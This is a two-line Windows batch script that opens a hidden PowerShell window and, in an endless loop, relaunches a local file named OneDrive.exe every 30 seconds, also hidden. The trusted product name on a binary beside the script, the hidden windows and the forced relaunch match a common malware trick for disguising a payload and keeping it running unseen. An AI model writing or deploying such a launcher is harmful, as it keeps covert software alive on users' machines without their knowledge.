@echo off
powershell -WindowStyle Hidden -Command "$processArgs = @{ FilePath = \"%~dp0OneDrive.exe\"; WindowStyle = \"Hidden\" }; while ($true) { Start-Process @processArgs; Start-Sleep -Seconds 30 }"
